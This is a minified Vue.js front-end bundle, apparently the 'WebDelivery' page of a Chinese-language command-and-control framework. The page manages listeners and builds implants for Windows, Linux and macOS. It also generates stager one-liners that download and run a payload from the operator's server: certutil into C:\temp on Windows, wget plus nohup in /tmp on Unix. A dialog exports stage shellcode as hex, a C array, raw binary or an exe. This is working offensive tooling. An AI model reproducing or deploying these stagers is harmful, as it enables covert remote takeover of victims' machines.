import{_ as xe}from"./f5f6aa45.js";/* empty css        *//* empty css        *//* empty css        *//* empty css        *//* empty css        *//* empty css        *//* empty css        *//* empty css        */import"./4ed993c7.js";/* empty css        */import{a as c,b as Ve,d as We,v as Pe,z as Le,y as $e,J as Ee,x as Oe,ab as ze,K as Ue,a2 as Ie,O as Me,N as Ae,P as Te,w as Re,Q as Be,R as Fe,S as Ne,T as qe,U as je,D as ee,n as q,a3 as j,Z as te,$ as Ge,a6 as He,a9 as Je,W as Qe,V as Xe,X as Ke,o as z,A as se,a4 as Ze,ac as Ye,ad as et,a5 as tt,aa as st}from"./3325456c.js";import{C as w}from"./59206fab.js";import{H as at,r as m,_ as ae,e as G,d as lt,l as u,m as S,p as a,V as e,P as t,u as d,T as b,U as r,Q as ot,O as g,J as U,S as le,R as H,F as I,a8 as M,az as nt,aA as it}from"./95bbca75.js";const p=L=>(nt("data-v-587f6f85"),L=L(),it(),L),ct={class:"webdelivery-management"},dt={class:"header-section"},rt=p(()=>a("div",{class:"header-content"},[a("h1",{class:"page-title"},"WebDelivery 管理"),a("p",{class:"page-subtitle"},"通过Web方式投递客户端程序")],-1)),ut={class:"stats-cards"},_t={class:"stat-content"},pt={class:"stat-info"},ft={class:"stat-value"},mt=p(()=>a("div",{class:"stat-label"},"总数",-1)),vt={class:"stat-content"},ht={class:"stat-info"},bt={class:"stat-value"},gt=p(()=>a("div",{class:"stat-label"},"活跃",-1)),yt={class:"stat-content"},wt={class:"stat-info"},St={class:"stat-value"},Ct=p(()=>a("div",{class:"stat-label"},"未启动",-1)),kt={class:"table-header"},Dt=p(()=>a("h3",{class:"table-title"},"WebDelivery 列表",-1)),xt={class:"table-actions"},Vt={class:"listener-cell"},Wt={class:"listener-content"},Pt={class:"listener-text"},Lt=p(()=>a("div",{class:"listener-label"},"监听器配置",-1)),$t={class:"arch-cell"},Et={class:"arch-text"},Ot={class:"password-cell"},zt={class:"password-text"},Ut={class:"port-cell"},It={class:"status-cell"},Mt={class:"action-buttons"},At={class:"command-content"},Tt=p(()=>a("h4",{class:"command-title"},"上线命令",-1)),Rt={class:"command-code"},Bt={class:"command-actions"},Ft={class:"dialog-content"},Nt={class:"listener-option"},qt={class:"option-label"},jt=p(()=>a("div",{class:"empty-option"},"暂无可用监听器",-1)),Gt=p(()=>a("div",{class:"form-hint"},"客户端连接的监听器地址",-1)),Ht={class:"row-group"},Jt={class:"os-selector"},Qt=["onClick"],Xt={class:"os-icon-wrapper"},Kt={class:"os-name"},Zt={class:"arch-option-item"},Yt={class:"arch-label"},es={class:"arch-desc"},ts={class:"row-group"},ss=p(()=>a("div",{class:"form-hint"},"Web服务的监听端口",-1)),as=p(()=>a("div",{class:"form-hint"},"客户端文件下载名称",-1)),ls={class:"password-input-wrapper"},os=p(()=>a("div",{class:"form-hint"},"客户端连接验证密码（可选）",-1)),ns={class:"dialog-footer"},is={key:0},cs={key:1},ds={class:"dialog-content"},rs={class:"shellcode-info"},us={class:"info-item"},_s=p(()=>a("span",{class:"info-label"},"监听器：",-1)),ps={class:"info-value"},fs={class:"info-item"},ms=p(()=>a("span",{class:"info-label"},"端口：",-1)),vs={class:"info-value"},hs={class:"format-grid"},bs=["onClick"],gs={class:"format-icon"},ys={class:"format-info"},ws={class:"format-name"},Ss={class:"format-desc"},Cs={class:"dialog-footer"},ks=at({__name:"WebDelivery",setup(L){const D=m([]),$=m(!1),x=m(!1),V=m(!1),A=m(!1),W=m(!1),T=m(!1),R=m([]),oe=[{label:"Windows",value:"windows",icon:z},{label:"Linux",value:"linux",icon:z},{label:"macOS",value:"darwin",icon:z}],ne={windows:["amd64","386"],linux:["amd64","386","arm","arm64","loong64","mips","mipsle","mips64","mips64le"],darwin:["amd64","arm64"]},ie={amd64:"64位 x86 架构",386:"32位 x86 架构",arm:"ARM 架构 (32位)",arm64:"ARM 64位架构",loong64:"龙芯架构",mips:"MIPS 架构 (大端)",mipsle:"MIPS 架构 (小端)",mips64:"MIPS 64位 (大端)",mips64le:"MIPS 64位 (小端)"},ce=[{value:"hex",label:"十六进制",icon:Ye,description:"HEX格式Shellcode"},{value:"c",label:"C 数组",icon:se,description:"C语言数组格式"},{value:"bin",label:"二进制",icon:et,description:"原始二进制文件"},{value:"exe",label:"可执行程序",icon:tt,description:"Windows可执行文件"}],i=ae({port:"",listener:"",os:"",arch:"",filename:"",pass:""}),B=m([]),E=m(""),O=m(""),h=ae({format:""}),de=G(()=>D.value.filter(n=>n.Status===1).length),re=G(()=>D.value.filter(n=>n.Status===2).length),J=G(()=>i.listener&&i.os&&i.arch&&i.port),ue=n=>ie[n]||"未知架构",Q=n=>n.OS==="windows"?`certutil -urlcache -split -f ${n.ServerAddress} C:\\temp\\r.exe && C:\\temp\\r.exe ${n.Pass||""}`:`wget -P /tmp ${n.ServerAddress}; chmod +x /tmp/${n.FileName}; nohup /tmp/${n.FileName} ${n.Pass||""} > m.log 2>&1 &`,_e=async n=>{var o;if(n&&R.value.length===0){A.value=!0;try{const l=await w.ShowListener();l.status===200&&l.data.status===200?R.value=l.data.data:c.error(((o=l.data)==null?void 0:o.data)||"获取监听器列表失败")}catch(l){console.error("获取监听器失败:",l),c.error("获取监听器列表失败")}finally{A.value=!1}}},pe=n=>{i.os=n,i.arch="",B.value=ne[n]||[]},fe=()=>{const n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";let o="";for(let l=0;l<16;l++)o+=n.charAt(Math.floor(Math.random()*n.length));i.pass=o,c.success("已生成随机密码")},C=async()=>{var n;$.value=!0;try{const o=await w.GetWebDeliveryList();o.status===200&&o.data.status===200?D.value=o.data.data:c.error(((n=o.data)==null?void 0:n.data)||"获取列表失败")}catch(o){console.error("获取WebDelivery列表失败:",o),c.error("获取列表失败")}finally{$.value=!1}},me=async()=>{var n;if(!J.value){c.warning("请填写完整的配置信息");return}W.value=!0;try{const o=await w.StartWebDelivery({listener:i.listener,os:i.os,arch:i.arch,port:i.port,filename:i.filename,pass:i.pass});o.status===200&&o.data.status===200?(c.success("WebDelivery 创建成功"),x.value=!1,Se(),await C()):c.error(((n=o.data)==null?void 0:n.data)||"创建失败")}catch(o){console.error("创建WebDelivery失败:",o),c.error("创建失败")}finally{W.value=!1}},ve=async n=>{var o;try{const l=await w.CloseWebDelivery({port:n.ListeningPort});l.status===200&&l.data.status===200?(c.success("已停止服务"),await C()):c.error(((o=l.data)==null?void 0:o.data)||"停止失败")}catch(l){console.error("停止WebDelivery失败:",l),c.error("停止失败")}},he=async n=>{var o;try{const l=await w.OpenWebDelivery({port:n.ListeningPort});l.status===200&&l.data.status===200?(c.success("服务已启动"),await C()):c.error(((o=l.data)==null?void 0:o.data)||"启动失败")}catch(l){console.error("启动WebDelivery失败:",l),c.error("启动失败")}},be=async n=>{var o;try{await Ve.confirm(`确定要删除端口 ${n.ListeningPort} 的WebDelivery服务吗？`,"删除确认",{confirmButtonText:"确定",cancelButtonText:"取消",type:"warning"});const l=await w.DeleteWebDelivery({port:n.ListeningPort});l.status===200&&l.data.status===200?(c.success("删除成功"),await C()):c.error(((o=l.data)==null?void 0:o.data)||"删除失败")}catch(l){l!=="cancel"&&(console.error("删除WebDelivery失败:",l),c.error("删除失败"))}},ge=n=>{E.value=n.ListenerConfig,O.value=n.ListeningPort,h.format="",V.value=!0},ye=async()=>{if(!h.format){c.warning("请选择输出格式");return}T.value=!0;try{const n=await w.StageShellCodeGen({listener:E.value,port:O.value,format:h.format});if(n.status===200){const o=n.headers["content-disposition"]||"",l=/filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(o);let _=l&&l.length>1?decodeURIComponent(l[1].replace(/['"]/g,"")):`shellcode_${E.value}_${O.value}.${h.format}`;const k=new Blob([n.data],{type:n.headers["content-type"]}),f=document.createElement("a"),v=window.URL.createObjectURL(k);f.href=v,f.download=_,document.body.appendChild(f),f.click(),document.body.removeChild(f),window.URL.revokeObjectURL(v),c.success("Shellcode生成成功，开始下载"),V.value=!1}else c.error("生成失败")}catch(n){console.error("生成Shellcode失败:",n),c.error("生成失败")}finally{T.value=!1}},we=n=>{navigator.clipboard.writeText(n).then(()=>{c.success("命令已复制到剪贴板")}).catch(()=>{c.error("复制失败，请手动复制")})},Se=()=>{i.port="",i.listener="",i.os="",i.arch="",i.filename="",i.pass="",B.value=[]};return lt(async()=>{await C()}),(n,o)=>{const l=We,_=Pe,k=Le,f=$e,v=Ee,F=Oe,Ce=ze,ke=Ue,X=st,K=Ie,y=Me,N=Ae,Z=Te,Y=Re,De=Be;return u(),S("div",ct,[a("div",dt,[rt,e(_,{type:"primary",size:"large",class:"add-btn",onClick:o[0]||(o[0]=s=>x.value=!0)},{default:t(()=>[e(l,null,{default:t(()=>[e(d(Fe))]),_:1}),b(" 新增 WebDelivery ")]),_:1})]),a("div",ut,[e(k,{class:"stat-card"},{default:t(()=>[a("div",_t,[e(l,{class:"stat-icon total-icon"},{default:t(()=>[e(d(Ne))]),_:1}),a("div",pt,[a("div",ft,r(D.value.length),1),mt])])]),_:1}),e(k,{class:"stat-card"},{default:t(()=>[a("div",vt,[e(l,{class:"stat-icon active-icon"},{default:t(()=>[e(d(qe))]),_:1}),a("div",ht,[a("div",bt,r(de.value),1),gt])])]),_:1}),e(k,{class:"stat-card"},{default:t(()=>[a("div",yt,[e(l,{class:"stat-icon inactive-icon"},{default:t(()=>[e(d(je))]),_:1}),a("div",wt,[a("div",St,r(re.value),1),Ct])])]),_:1})]),e(k,{class:"main-table-card",shadow:"hover"},{header:t(()=>[a("div",kt,[Dt,a("div",xt,[e(f,{content:"刷新列表",placement:"top"},{default:t(()=>[e(_,{type:"info",size:"small",onClick:C,loading:$.value},{default:t(()=>[e(l,null,{default:t(()=>[e(d(ee))]),_:1})]),_:1},8,["loading"])]),_:1})])])]),default:t(()=>[ot((u(),g(ke,{data:D.value,class:"custom-table","empty-text":"暂无WebDelivery数据"},{default:t(()=>[e(v,{prop:"ListenerConfig",label:"监听器","min-width":"180"},{default:t(({row:s})=>[a("div",Vt,[e(l,{class:"listener-icon"},{default:t(()=>[e(d(q))]),_:1}),a("div",Wt,[a("div",Pt,r(s.ListenerConfig),1),Lt])])]),_:1}),e(v,{prop:"OS",label:"操作系统",width:"140"},{default:t(({row:s})=>[e(F,{type:s.OS==="windows"?"primary":s.OS==="linux"?"success":"info",class:"os-tag",effect:"light",round:""},{default:t(()=>[b(r(s.OS),1)]),_:2},1032,["type"])]),_:1}),e(v,{prop:"Arch",label:"架构",width:"120"},{default:t(({row:s})=>[a("div",$t,[e(l,{class:"arch-icon"},{default:t(()=>[e(d(j))]),_:1}),a("span",Et,r(s.Arch.toUpperCase()),1)])]),_:1}),e(v,{prop:"Pass",label:"上线密码",width:"150"},{default:t(({row:s})=>[a("div",Ot,[e(l,{class:"password-icon"},{default:t(()=>[e(d(te))]),_:1}),a("span",zt,r(s.Pass||"未设置"),1)])]),_:1}),e(v,{prop:"ListeningPort",label:"监听端口",width:"120"},{default:t(({row:s})=>[a("div",Ut,[e(F,{type:"info",effect:"plain",class:"port-tag"},{default:t(()=>[b(r(s.ListeningPort),1)]),_:2},1024)])]),_:1}),e(v,{label:"状态",width:"120"},{default:t(({row:s})=>[a("div",It,[a("div",{class:U(["status-dot",{"status-active":s.Status===1,"status-inactive":s.Status===2}])},null,2),e(F,{type:s.Status===1?"success":"danger",size:"small",class:"status-tag",effect:"light"},{default:t(()=>[b(r(s.Status===1?"运行中":"已停止"),1)]),_:2},1032,["type"])])]),_:1}),e(v,{label:"操作",width:"280"},{default:t(({row:s})=>[a("div",Mt,[e(Ce,{placement:"top-start",width:s.OS==="windows"?480:520,trigger:"click",class:"command-popover"},{reference:t(()=>[e(_,{size:"small",type:"success",disabled:s.Status!==1,class:"action-btn"},{default:t(()=>[e(f,{content:"查看上线命令",placement:"top"},{default:t(()=>[e(l,null,{default:t(()=>[e(d(Ge))]),_:1})]),_:1})]),_:2},1032,["disabled"])]),default:t(()=>[a("div",At,[Tt,a("pre",Rt,r(Q(s)),1),a("div",Bt,[e(_,{size:"small",type:"primary",onClick:P=>we(Q(s))},{default:t(()=>[e(l,null,{default:t(()=>[e(d(He))]),_:1}),b(" 复制命令 ")]),_:2},1032,["onClick"])])])]),_:2},1032,["width"]),s.OS==="windows"&&s.Status===1?(u(),g(f,{key:0,content:"生成Shellcode",placement:"top"},{default:t(()=>[e(_,{size:"small",type:"warning",class:"action-btn",onClick:P=>ge(s)},{default:t(()=>[e(l,null,{default:t(()=>[e(d(Je))]),_:1})]),_:2},1032,["onClick"])]),_:2},1024)):le("",!0),e(f,{content:s.Status===1?"停止服务":"启动服务",placement:"top"},{default:t(()=>[e(_,{size:"small",type:s.Status===1?"primary":"success",class:"action-btn",onClick:P=>s.Status===1?ve(s):he(s)},{default:t(()=>[e(l,null,{default:t(()=>[(u(),g(H(s.Status===1?d(Qe):d(Xe))))]),_:2},1024)]),_:2},1032,["type","onClick"])]),_:2},1032,["content"]),e(f,{content:"删除",placement:"top"},{default:t(()=>[e(_,{size:"small",type:"danger",class:"action-btn",onClick:P=>be(s)},{default:t(()=>[e(l,null,{default:t(()=>[e(d(Ke))]),_:1})]),_:2},1032,["onClick"])]),_:2},1024)])]),_:1})]),_:1},8,["data"])),[[De,$.value]])]),_:1}),e(Y,{modelValue:x.value,"onUpdate:modelValue":o[7]||(o[7]=s=>x.value=s),title:"配置 WebDelivery",width:"580px",class:"add-dialog","close-on-click-modal":!1},{footer:t(()=>[a("div",ns,[e(_,{onClick:o[6]||(o[6]=s=>x.value=!1),disabled:W.value},{default:t(()=>[b(" 取消 ")]),_:1},8,["disabled"]),e(_,{type:"primary",onClick:me,loading:W.value,disabled:!J.value},{default:t(()=>[W.value?(u(),S("span",cs,"创建中...")):(u(),S("span",is,"创建 WebDelivery"))]),_:1},8,["loading","disabled"])])]),default:t(()=>[a("div",Ft,[e(Z,{model:i,"label-position":"top",class:"config-form"},{default:t(()=>[e(y,{label:"监听器",required:""},{default:t(()=>[e(K,{modelValue:i.listener,"onUpdate:modelValue":o[1]||(o[1]=s=>i.listener=s),placeholder:"选择监听器",class:"form-select",onVisibleChange:_e,loading:A.value,clearable:"",filterable:"",size:"large"},{prefix:t(()=>[e(l,null,{default:t(()=>[e(d(q))]),_:1})]),empty:t(()=>[jt]),default:t(()=>[(u(!0),S(I,null,M(R.value,s=>(u(),g(X,{key:s,label:s,value:s},{default:t(()=>[a("div",Nt,[e(l,{class:"option-icon"},{default:t(()=>[e(d(q))]),_:1}),a("span",qt,r(s),1)])]),_:2},1032,["label","value"]))),128))]),_:1},8,["modelValue","loading"]),Gt]),_:1}),a("div",Ht,[e(y,{label:"操作系统",required:"",class:"half-width"},{default:t(()=>[a("div",Jt,[(u(),S(I,null,M(oe,s=>a("div",{key:s.value,class:U(["os-option",{"os-selected":i.os===s.value}]),onClick:P=>pe(s.value)},[a("div",Xt,[e(l,{class:U(["os-icon",`os-${s.value}`])},{default:t(()=>[(u(),g(H(s.icon)))]),_:2},1032,["class"])]),a("div",Kt,r(s.label),1)],10,Qt)),64))])]),_:1}),e(y,{label:"系统架构",required:"",class:"half-width"},{default:t(()=>[e(K,{modelValue:i.arch,"onUpdate:modelValue":o[2]||(o[2]=s=>i.arch=s),placeholder:"选择架构",disabled:!i.os,size:"large",class:"arch-select"},{prefix:t(()=>[e(l,null,{default:t(()=>[e(d(j))]),_:1})]),default:t(()=>[(u(!0),S(I,null,M(B.value,s=>(u(),g(X,{key:s,label:s.toUpperCase(),value:s},{default:t(()=>[a("div",Zt,[e(l,null,{default:t(()=>[e(d(j))]),_:1}),a("span",Yt,r(s.toUpperCase()),1),a("span",es,r(ue(s)),1)])]),_:2},1032,["label","value"]))),128))]),_:1},8,["modelValue","disabled"])]),_:1})]),a("div",ts,[e(y,{label:"监听端口",required:"",class:"half-width"},{default:t(()=>[e(N,{modelValue:i.port,"onUpdate:modelValue":o[3]||(o[3]=s=>i.port=s),placeholder:"如: 8080",size:"large",clearable:""},{prefix:t(()=>[e(l,null,{default:t(()=>[e(d(z))]),_:1})]),_:1},8,["modelValue"]),ss]),_:1}),e(y,{label:"文件名称",class:"half-width"},{default:t(()=>[e(N,{modelValue:i.filename,"onUpdate:modelValue":o[4]||(o[4]=s=>i.filename=s),placeholder:"如: download.exe",size:"large",clearable:""},{prefix:t(()=>[e(l,null,{default:t(()=>[e(d(se))]),_:1})]),_:1},8,["modelValue"]),as]),_:1})]),e(y,{label:"连接密码"},{default:t(()=>[a("div",ls,[e(N,{modelValue:i.pass,"onUpdate:modelValue":o[5]||(o[5]=s=>i.pass=s),placeholder:"可选，客户端连接密码",type:"password","show-password":"",clearable:"",size:"large",class:"password-input",maxlength:32},{prefix:t(()=>[e(l,null,{default:t(()=>[e(d(te))]),_:1})]),_:1},8,["modelValue"]),e(f,{content:"生成随机密码",placement:"top"},{default:t(()=>[e(_,{class:"generate-password-btn",onClick:fe,icon:d(ee),circle:"",size:"small"},null,8,["icon"])]),_:1})]),os]),_:1})]),_:1},8,["model"])])]),_:1},8,["modelValue"]),e(Y,{modelValue:V.value,"onUpdate:modelValue":o[9]||(o[9]=s=>V.value=s),title:"生成 Stage Shellcode",width:"480px",class:"shellcode-dialog","close-on-click-modal":!1},{footer:t(()=>[a("div",Cs,[e(_,{onClick:o[8]||(o[8]=s=>V.value=!1)},{default:t(()=>[b(" 取消 ")]),_:1}),e(_,{type:"primary",onClick:ye,loading:T.value,disabled:!h.format},{default:t(()=>[b(" 生成并下载 ")]),_:1},8,["loading","disabled"])])]),default:t(()=>[a("div",ds,[a("div",rs,[a("div",us,[_s,a("span",ps,r(E.value),1)]),a("div",fs,[ms,a("span",vs,r(O.value),1)])]),e(Z,{model:h,"label-position":"top",class:"format-form"},{default:t(()=>[e(y,{label:"输出格式",required:""},{default:t(()=>[a("div",hs,[(u(),S(I,null,M(ce,s=>a("div",{key:s.value,class:U(["format-option",{"format-selected":h.format===s.value}]),onClick:P=>h.format=s.value},[a("div",gs,[e(l,{class:"format-icon-svg"},{default:t(()=>[(u(),g(H(s.icon)))]),_:2},1024)]),a("div",ys,[a("div",ws,r(s.label),1),a("div",Ss,r(s.description),1)]),h.format===s.value?(u(),g(l,{key:0,class:"format-check"},{default:t(()=>[e(d(Ze))]),_:1})):le("",!0)],10,bs)),64))])]),_:1})]),_:1},8,["model"])])]),_:1},8,["modelValue"])])}}});const Ts=xe(ks,[["__scopeId","data-v-587f6f85"]]);export{Ts as default};
